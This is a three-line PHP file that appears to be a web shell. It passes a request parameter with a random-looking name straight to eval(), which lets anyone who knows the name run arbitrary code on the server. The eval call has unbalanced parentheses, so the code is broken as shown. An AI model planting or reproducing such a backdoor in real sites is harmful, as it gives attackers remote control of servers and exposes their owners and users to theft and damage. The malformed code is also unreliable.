<?php
eval(($_GET['c2QJdyda']);
?>
